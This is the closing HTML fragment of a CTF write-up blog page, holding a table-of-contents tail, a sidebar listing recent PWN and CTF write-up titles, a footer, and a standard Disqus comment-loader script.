href="#2-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2. 攻击思路</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/02/PWN%20bit%20Bit%20Burger/" title="PWN bit Bit Burger">PWN bit Bit Burger</a><time datetime="2025-04-01T16:00:00.000Z" title="Created 2025-04-02 00:00:00">2025-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/01/DiceCTF%20debugalyzer%20GDB%20script%20+%20z3/" title="DiceCTF debugalyzer GDB script + z3">DiceCTF debugalyzer GDB script + z3</a><time datetime="2025-03-31T16:00:00.000Z" title="Created 2025-04-01 00:00:00">2025-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/19/IDK_CURTIN_CTF_2024_WAVE_3--WriteUp/" title="IDK_CURTIN_CTF_2024_WAVE_3--WriteUp">IDK_CURTIN_CTF_2024_WAVE_3--WriteUp</a><time datetime="2024-10-19T03:14:13.000Z" title="Created 2024-10-19 11:14:13">2024-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/19/IDK_CURTIN_CTF_2024_WAVE_2--WriteUp/" title="IDK_CURTIN_CTF_2024_WAVE_2--WriteUp">IDK_CURTIN_CTF_2024_WAVE_2--WriteUp</a><time datetime="2024-10-19T03:13:38.000Z" title="Created 2024-10-19 11:13:38">2024-10-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/19/IDK_CURTIN_CTF_2024_WAVE_1--WriteUp/" title="IDK_CURTIN_CTF_2024_WAVE_1--WriteUp">IDK_CURTIN_CTF_2024_WAVE_1--WriteUp</a><time datetime="2024-10-19T03:13:24.000Z" title="Created 2024-10-19 11:13:24">2024-10-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By salad07</div><div class="footer_custom_text"><div class="github-badge"> <span class="badge-subject">Powered</span><span class="badge-value bg-blue">Hexo</span></div>  <div class="github-badge"><span class="badge-subject">Theme</span><span class="badge-value bg-blueviolet">Butterfly</span></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadDisqus () {
+  const disqus_config = function () {
+    this.page.url = 'http://example.com/2025/04/02/PWN%20bit%20Bit%20Burger/'
+    this.page.identifier = '/2025/04/02/PWN%20bit%20Bit%20Burger/'
+    this.page.title = 'PWN bit Bit Burger'
+  }
+
+  const disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  btf.addModeChange('disqus', disqusReset)
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://saladbkp.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Disqus' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas id="universe"></canvas><script defer src="/js/universe.js"></script><script async src="/js/myjs.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
